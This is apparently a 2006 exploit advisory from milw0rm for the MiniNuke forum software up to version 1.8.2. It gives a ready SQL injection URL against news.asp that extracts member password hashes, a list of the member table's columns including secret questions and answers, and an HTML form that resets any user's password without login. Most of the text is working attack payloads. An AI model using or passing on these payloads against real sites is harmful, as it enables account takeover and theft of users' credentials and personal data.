Contacts:{
ICQ: 10072
MSN/Email: nukedx@nukedx.com
Web: http://www.nukedx.com
}


---
Vendor: MiniNuke (www.miniex.net)
Version: 1.8.2 and prior versions must be affected.
About:Via this method remote attacker can inject SQL query to the news.asp 
---
How&Example: GET -> http://[site]/news.asp?Action=Print&hid=[SQLQuery]
http://www.miniex.net/news.asp?Action=Print&hid=66%20union+select+0,sifre,0,0,0,0,0,0,0,0+from+members+where+uye_id=52

Columns of MEMBERS:
uye_id = userid
sifre = md5 password hash
g_soru = secret question.
g_cevap = secret answer
email = mail address
isim = name
icq = ICQ Uin
msn = MSN Sn.
aim = AIM Sn.
meslek = job
cinsiyet = gender
yas = age
url = url
imza = signature
mail_goster = show mail :P
avurl = avatar url
avatar = avatar


---
Vendor: MiniNuke (www.miniex.net)
Version: 1.8.2 and prior versions must be affected.
About:Via this method remote attacker can change any users password without login.
---
How&Example: 
HTML Example
[code]
<html>
<title>MiniNuke <= 1.8.2 remote user password change</title>
<form method="POST" action="http://[SITE]/membership.asp?action=lostpassnew">
<table border="0" cellspacing="1" cellpadding="0" align="center" width="75%">
<tr><td colspan="2" align="center"><font face=verdana size=2>Now fill in the blanks</font></td></tr>
<tr><td colspan="2" align="center"><font face=tahoma size=1red>Change password </font></td></tr>
<tr><td width="50%" align="right"><font face=verdana size=1>PASSWORD: </font></td>
<td width="50%"><input type="text" name="pass" size="20"></td></tr>
<tr><td width="50%" align="right"><font face=verdana size=1>PASSWORD Again : </font></td>
<td width="50%"><input type="text" name="passa" size="20"><input type="text" name="x" value="Membername">&nbsp;&nbsp;
<input type="submit" value="Send" name="B1" style="font-family: Verdana; font-size: 10px; border: 1px ridge #FFFFFF; background-color: #FFFFFF"></td></tr>
</table></form>
</html>
[/code]

# milw0rm.com [2006-01-14]